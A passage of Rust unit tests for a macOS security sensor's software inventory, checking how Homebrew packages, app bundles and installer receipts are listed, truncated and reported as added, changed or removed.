        "the newest keg of a formula, a cask apart from a formula of the same name, a bundle without a version or an executable is still listed"
    );
}

#[test]
fn test_long_package_fields_are_cut() {
    let tree = Tree::new("packages-long");
    let long = "n".repeat(1000);
    tree.write("/Applications/Long.app/Contents/Info.plist", info_plist(&format!("<key>CFBundleShortVersionString</key><string>{}</string>", long)));
    tree.mkdir(&format!("/opt/homebrew/Caskroom/{}/1.0", "f".repeat(255)));

    let packages = tree.packages().unwrap();
    assert!(packages.iter().all(|package| package.name.len() <= 256 && package.version.len() <= 256));
    assert_eq!(packages.len(), 2);
}

#[test]
fn test_package_folder_that_cannot_be_read_is_an_error() {
    if host::own_uid() == 0 {
        return;
    }
    let tree = Tree::new("packages-unreadable");
    tree.mkdir("/Applications/Example.app");
    std::fs::set_permissions(tree.at("/Applications"), std::fs::Permissions::from_mode(0o000)).unwrap();

    assert_eq!(tree.packages(), Err("/Applications cannot be read".to_string()), "what an unreadable folder lists would otherwise look removed");
}

fn package_changes(events: Vec<SystemEvent>) -> Vec<(InventoryAction, String, String, Option<String>)> {
    events
        .into_iter()
        .filter_map(|event| match event {
            SystemEvent::Package(event) => Some((event.action, event.name, event.version, event.previous_version)),
            _ => None,
        })
        .collect()
}

#[test]
fn test_installed_upgraded_and_removed_packages_reach_the_sensor_as_events() {
    let tree = Tree::new("sensor-packages");
    tree.mkdir("/opt/homebrew/Cellar/curl/8.11.0");
    tree.mkdir("/opt/homebrew/Cellar/openssl@3/3.4.0");
    let mut sensor = Sensor::new(MacSource::new(&tree.root).unwrap(), std::process::id(), 60, 300);

    assert_eq!(
        package_changes(sensor.poll(1_000).events),
        vec![
            (InventoryAction::Present, "curl".to_string(), "8.11.0".to_string(), None),
            (InventoryAction::Present, "openssl@3".to_string(), "3.4.0".to_string(), None),
        ]
    );

    std::fs::remove_dir_all(tree.at("/opt/homebrew/Cellar/curl")).unwrap();
    tree.mkdir("/opt/homebrew/Cellar/openssl@3/3.4.1");
    tree.mkdir("/opt/homebrew/Cellar/nmap/7.95");

    assert!(package_changes(sensor.poll(1_060).events).is_empty(), "packages are not read as often as persistence");
    assert_eq!(
        package_changes(sensor.poll(1_300).events),
        vec![
            (InventoryAction::Removed, "curl".to_string(), "8.11.0".to_string(), None),
            (InventoryAction::Added, "nmap".to_string(), "7.95".to_string(), None),
            (InventoryAction::Changed, "openssl@3".to_string(), "3.4.1".to_string(), Some("3.4.0".to_string())),
        ]
    );
}

#[test]
fn test_packages_of_this_mac_are_read_without_error() {
    let packages = packages::scan(Path::new("/"), kernel::user_name).unwrap();
    assert!(packages.iter().all(|package| package.name.len() <= 256 && package.version.len() <= 256 && !package.architecture.is_empty()));
    let count = |manager| packages.iter().filter(|package| package.manager == manager).count();
    println!(
        "{} packages: {} Homebrew, {} application bundles, {} installer receipts",
        packages.len(),
        count(PackageManager::Homebrew),
        count(PackageManager::MacApp),
        count(PackageManager::MacPkg)
    );
    assert!(count(PackageManager::MacPkg) > 0, "every Mac keeps installer receipts");
}
